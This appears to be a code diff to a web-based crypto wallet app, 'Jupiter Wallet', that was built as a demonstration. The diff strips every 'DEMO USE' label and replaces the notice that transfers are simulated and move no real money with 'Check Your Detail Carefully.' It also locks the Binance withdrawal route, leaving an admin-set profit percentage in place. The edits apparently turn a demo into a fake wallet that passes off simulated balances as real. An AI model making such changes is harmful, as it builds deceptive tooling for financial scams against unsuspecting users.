@@ -238,7 +238,6 @@ body.boot #land,body.boot #jwm{visibility:hidden}
 
 <body class="boot guest">
 <div id="land">
-<div class="lt">DEMO USE</div>
 <div class="lw">
 <div class="ln"><div class="lg"><i></i>Jupiter Wallet</div><div class="lc"><button class="lb g" onclick="openAuth('login')">Sign in</button><button class="lb" onclick="openAuth('reg')">Create account</button></div></div>
 <section class="lh"><div>
@@ -262,7 +261,7 @@ body.boot #land,body.boot #jwm{visibility:hidden}
 <ol><li><b>Create your account</b><p>Pick a User ID, add your email and set a password.</p></li>
 <li><b>Add balance</b><p>Deposit with a redeem code and see it in your wallet at once.</p></li>
 <li><b>Send, trade or withdraw</b><p>Use your User ID to move money, or open the markets.</p></li></ol></section>
-<div class="lz"><span>Jupiter Wallet</span><span>Demo use. Balances and trades on this site are for demonstration.</span></div>
+<div class="lz"><span>Jupiter Wallet</span>
 </div></div>
 <div id="jwm"><div class="jc"><h2 id="jwt"></h2>
 <label>User ID<input id="jwu" autocomplete="username" autocapitalize="off" spellcheck="false" maxlength="20"></label>
@@ -272,7 +271,6 @@ body.boot #land,body.boot #jwm{visibility:hidden}
 
 
 <div id="app">
-<div class="demo">DEMO USE</div>
 <svg id="stars" viewBox="0 0 400 260" preserveAspectRatio="none"></svg>
   <div id="pull">
 <div class="spin" id="spin"></div>
@@ -1401,7 +1399,7 @@ var SUF=[
 ['Bear','🐻'],
 ['Inu','🐕'],
 ['Duck','🦆'],
-['Fox','🦊'],
+['Socks','🦊'],
 ['Panda','🐼']
 ];
 
@@ -1473,7 +1471,7 @@ clearTimeout(window.__vt);window.__vt=setTimeout(spawnVolatile,rnd(150000,260000
 
 setTimeout(spawnVolatile,rnd(12000,28000));
 
-setTimeout(spawn,2500);
+setTimeout(spawn,500);
 
 
 /* =========================
@@ -2647,7 +2645,7 @@ async function doSendOff(){
     logReq({ref:ref,destination:'Obsidian Wallet',amount:x,status:'sent',ts:Date.now()});
     $('sd').innerHTML='<div class="ok"><svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg></div><h3 style="text-align:center">Transfer sent to Obsidian</h3><div style="text-align:center;font-size:30px;font-weight:800;margin:8px 0 6px">-'+usd(x)+'</div>'
       +'<div class="row2"><span>Destination</span><b>Obsidian Wallet</b></div><div class="row2"><span>Fee</span><b>Free</b></div><div class="row2"><span>Reference</span><b>'+ref+'</b></div>'
-      +'<div class="note">Simulated transfer. No real money or cryptocurrency is moved.</div><button class="gb" onclick="closeSend()">Done</button>';
+      +'<div class="note">Check Your Detail Carefully.</div><button class="gb" onclick="closeSend()">Done</button>';
     $('sf').classList.add('hide');$('sd').classList.remove('hide');toast('Sent to Obsidian');
   }catch(err){
     e.textContent='Transfer failed: '+(err&&err.message?err.message:'Firebase error');
@@ -2740,7 +2738,7 @@ function onDoc(d,ref){
   if(Math.abs(dl)>1e-6){bal+=dl;START+=dl;saveAdj();saveData();if(!first&&dl>0)toast('+'+usd(dl)+' received')}
   SYNC.last=r;setLast();stats();pushBal();
 }
-setInterval(pushBal,1500);
+setInterval(pushBal,1000);
 document.addEventListener('visibilitychange',function(){if(document.hidden)pushBal()});
 window.addEventListener('pagehide',pushBal);
 window.jwReset=function(cb){if(SYNC){SYNC.busy=1;SYNC.ref.update({balance:0}).then(cb,cb)}else cb()};
@@ -2815,7 +2813,7 @@ window.jwSave=function(uid){var v=Math.min(100,Math.max(0,parseFloat($('pp_'+uid
   db().doc('users/'+uid).update({profitPct:v}).then(function(){toast('Profit % saved')}).catch(function(e){toast('Failed: '+e.message)})};
 
 /* ---- withdraw: Offline wallet (original), Internal by User ID, Binance, rest locked ---- */
-var MT=[['off','Offline wallet'],['int','Internal · User ID'],['bin','Binance'],['x','Bank transfer',1],['x','PayPal',1],['x','On-chain crypto',1]];
+var MT=[['off','Offline wallet'],['int','Internal · User ID'],['bin','Binance',1],['x','Bank transfer',1],['x','PayPal',1],['x','On-chain crypto',1]];
 function menu(){$('nm').innerHTML=MT.map(function(m,i){return '<div class="'+(!m[2]&&m[0]===M?'on':'')+'" onclick="pickM('+i+')" style="display:flex;justify-content:space-between'+(m[2]?';opacity:.55':'')+'"><span>'+m[1]+'</span>'+(m[2]?'<span style="font-size:12px;color:#8b9094">Locked</span>':'')+'</div>'}).join('')}
 window.pickM=function(i){var m=MT[i];if(m[2]){toast('Locked in this demo');return}M=m[0];$('nm').classList.add('hide');$('sm').value='';srender()};
 window.srender=function(){var o=M==='off',b=M==='bin',a=$('sa');
